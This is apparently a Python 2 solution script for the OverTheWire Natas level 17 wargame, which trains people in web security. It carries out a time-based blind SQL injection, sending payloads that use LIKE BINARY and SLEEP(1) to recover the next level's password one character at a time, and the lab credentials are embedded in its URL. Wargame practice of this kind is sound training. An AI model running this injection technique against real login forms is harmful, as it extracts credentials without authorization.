#Brute forcing password for user 'natas18'
#using SQL injection & SLEEP()
import requests;
dest = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php';

chars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
attempt = '';
password = '';

for i in range (0, 32) :
	for i in range(0, len(chars)):
		attempt = password + chars[i];
		print 'Attempt: %s' % attempt;
		u = 'natas18" AND password LIKE BINARY \'' +attempt+ '%\' AND SLEEP(1) #';
		r = requests.post(dest,data={'username':u});
		if (r.elapsed.seconds >=1) :
			password = attempt;
			print 'SUCCESS! Password stands at %s' % password;
			break;
